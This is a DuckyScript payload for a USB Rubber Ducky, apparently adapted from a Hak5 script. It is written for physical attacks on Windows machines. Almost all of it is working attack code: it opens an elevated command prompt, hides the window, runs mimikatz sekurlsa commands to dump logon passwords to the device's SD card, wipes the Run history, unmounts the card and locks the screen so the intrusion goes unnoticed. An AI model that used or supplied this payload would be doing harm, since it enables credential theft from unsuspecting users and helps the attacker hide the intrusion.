REM Title: Invoke mimikatz and save passwords to the rubber ducky SD. You must download the files we need for have it ready for the attack: **NECESARY TWIN DUCK**
REM Author: Hak5Darren Props: Mubix, Clymb3r, Gentilkiwi. MODIFIED BY 4LON3LY0
REM 
REM The next two lines are because a twin duck rubber ducky is detected by the computer, and normally it open the explorer in the USB, for not have that problem when all is beeing executed, we wait until it is opened and we close it. 
DELAY 3500
ALT F4
REM Open an admin command prompt 
GUI r
DELAY 500
STRING powershell Start-Process cmd -Verb runAs
ENTER
DELAY 2000
ALT y
DELAY 1000
REM Obfuscate the command prompt
STRING mode con:cols=18 lines=1
ENTER
STRING color FE
ENTER
REM Invoke Mimikatz with lsass.dmp and save the results
STRING D:
ENTER
STRING mimikatz # sekurlsa::minidump lsass.dmp
ENTER
DELAY 1000
STRING mimikatz # sekurlsa::logonPasswords full
DELAY
ENTER
DELAY 15000
REM Clear the Run history
STRING powershell "Remove-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU' -Name '*' -ErrorAction SilentlyContinue"
ENTER
DELAY 50
REM We unmount de SD card for be unaccesible from de computer if somebody catch us (you can mount in your computer after the attack with 'mountvol D: (and here your volume, you can know the volume tag with the command 'mountvol')'.
REM Change this "\\?\Volume{aab583e5-447d-11ea-8e8d-b4a9fc03eb69}\" with your volume tag, you can know it with the command 'mountvol'.
STRING mountvol \\?\Volume{aab583e5-447d-11ea-8e8d-b4a9fc03eb69}\ /p
ENTER
DELAY 100
REM After the unmount, we will not need the command prompt more, so we close it.
STRING exit
ENTER
REM We block the computer so weâ€™re less suspicious. You can remove it if you think that it is unnecesary.
GUI L
REM Plug off the ducky and extract the micro SD. You will have there the extracted passwords.
